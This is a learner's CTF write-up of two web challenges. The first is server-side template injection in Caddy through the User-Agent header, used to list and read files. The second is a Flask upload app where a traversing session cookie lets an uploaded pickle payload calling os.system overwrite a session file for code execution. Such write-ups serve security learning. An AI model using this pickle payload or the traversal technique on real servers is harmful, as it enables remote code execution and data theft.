# WEB 
https://caddyserver.com/docs/modules/http.handlers.templates

## ez v2
```
ua.caddy.chal-kalmarc.tf {
tls internal
templates
import html_reply `User-Agent: {{.Req.Header.Get  "User-Agent"}}`
}

http.caddy.chal-kalmarc.tf {
tls internal
templates
import html_reply "You are connected with {http.request.proto} ({tls_version}, {tls_cipher})."
}
```
the vuln is based around the `User-Agent` that we supply through intercepting with burp
we can supply SSTI through it so our payload is executed server-side

A few knowledge needed to complete the chall is understanding how [caddy](https://caddyserver.com/docs/modules/http.handlers.templates) works 

so we can disclose file with "readFile" and "include".
and with "listFiles" we can list the current directory to find the flag that has been renamed randomly

## --WHAT I'VE LEARNED--
- the vuln: SSTI through user-agent
- knowledge about caddy configuration
- overlooking the caddyfile which is the core clue of this chall, previously i though it was like some docker conf file
-------------------------------

## FileStore

```
from flask import Flask, request, render_template, redirect, session
from flask_session import Session
import os

SESSION_TYPE = 'filesystem'
MAX_CONTENT_LENGTH = 1024 * 1024

app = Flask(__name__)
app.config.from_object(__name__)
Session(app)

@app.route('/', methods=['GET', 'POST'])
def index():
    path = f'static/uploads/{session.sid}' 
    if request.method == 'POST':
        f = request.files['file']
        if '..' in f.filename:
            return "bad", 400
        os.makedirs(path, exist_ok=True)
        f.save(path + '/' + f.filename)
        if not session.get('files'):
            session['files'] = []
        session['files'].append(f.filename)
        return redirect('/')
    return render_template('index.html', path=path, files=session.get('files', []))

if __name__ == "__main__":
    app.run(host='0.0.0.0')
```
given the app.py above my original thoughts are zipslip attack but it didn't turn out to be. i was to focused on how to bypass the '..' restriction
without considering that path Traversal could be achieved through {session.sid} which in this case is not sanitized

another thing to note is that 
``
Setting a flask session to filename means that session files are saved on the server as files. How do we save them? Well, using Pickle serialization of course! 
What’s crazy about this is that Pickle is considered dangerous and if you unpickle a user-controlled value it is essentially game over.
``
AND
``
The Dockerfile also contains: RUN chmod 777 static/uploads flask_session which is a pretty major hint that we are going to need to use this directory traversal to overwrite values in the flask_session directory.
``
i just noticed this after reading the WU

he sets his cookie to 'xxx' and is mapped by the server to '254b2716336df2553ce5c04a934d56e4'

so he made a pickle payload 
``
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('cp /flag.txt /app/static/uploads/abcd.txt')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    return b"\x00"*4 + payload


with open("254b2716336df2553ce5c04a934d56e4", "wb") as f:
    f.write(generate_exploit())
``
with this he changed the cookie from 'xxx' to '../../flask_session' and uploaded the file
which ultimately overwrite the session.

back to 'xxx' session to open the file which contain the flag

## -- WHAT I'VE LEARNED --
- the vuln is unsecure pickle with path traversal
- read the docker file, some clue like 'RUN chmod 777 static/uploads flask_session' might come in handy
- the serialize pickle is located in flask session that is configured to save files
  
